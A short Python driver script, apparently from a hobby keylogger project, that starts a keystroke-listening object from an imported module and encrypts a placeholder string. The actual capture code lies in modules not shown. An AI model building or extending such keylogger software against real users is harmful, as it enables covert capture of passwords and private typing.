import InterFace
import KeyLogger
import time
from threading import Thread
from Ciper import Cipher

a = InterFace.KeyLoggerSystem()
a.start_listening()
data  = "b"

cipher_data = Cipher()
cipher_data.cipher(data)
key = cipher_data.get_key()

